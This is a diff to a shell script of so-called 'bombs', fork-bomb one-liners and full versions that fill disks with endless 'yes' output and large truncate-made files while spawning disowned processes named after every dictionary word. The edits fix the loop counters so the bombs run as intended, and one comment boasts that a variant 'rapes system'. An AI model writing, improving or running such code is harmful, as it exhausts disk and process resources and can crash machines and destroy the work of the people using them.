@@ -5,7 +5,7 @@
 
 #yesbomb one
 #oneliner
-:{for(( i=0;;i+=1));do;yes balls>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
+:{for(( i=0;;i+=1));do;yes balls>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;((c++));done
 #full
 :
 {
@@ -20,12 +20,12 @@ while true; do
 	for word in $words; do
 		: $word$c & disown
 	done
-	counter+=1
+	((c++))
 done
 
 #yesbomb two
 #oneliner
-:{for((i=0;;i+=1));do;man bash|yes>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
+:{for((i=0;;i+=1));do;man bash|yes>.$1$i&disown;done};words=`cat /usr/share/dict/words`;:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;((c++));done
 #full
 :
 {
@@ -40,12 +40,12 @@ while true; do
 	for word in $words; do
 		: $word$c & disown
 	done
-	counter+=1
+	((c++))
 done
 
 #bomb three (truncate) - needs testing
 #oneliner
-:{for((i=0;;i+=1));do;truncate -s 1G .$1$i&disown;done};:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;counter+=1;done
+:{for((i=0;;i+=1));do;truncate -s 1G .$1$i&disown;done};:kittykatz&disown;c=0;while true;do;for word in $words;do;:$word$c&disown;done;((c++));done
 #full
 :
 {
@@ -59,7 +59,7 @@ while true; do
 	for word in $words; do
 		: $word$c & disown
 	done
-	counter+=1
+	((c++))
 done
 
 #bomb four (dd) - tested and rapes system
@@ -78,7 +78,7 @@ while true; do
 	for word in $words; do
 		: $word$c & disown
 	done
-	counter+=1
+	((c++))
 done
 
 #bomb five truncate and morph - needs testing
@@ -96,9 +96,10 @@ c=0
 while true; do
 	truncate -s 30G .$c
 	: .$c & disown
-	if [ c eq 5 ]; then
+	if [ $c -eq 10 ]; then
 		break
 	fi
+	((c++))
 done
 
 #hdd-filler 2
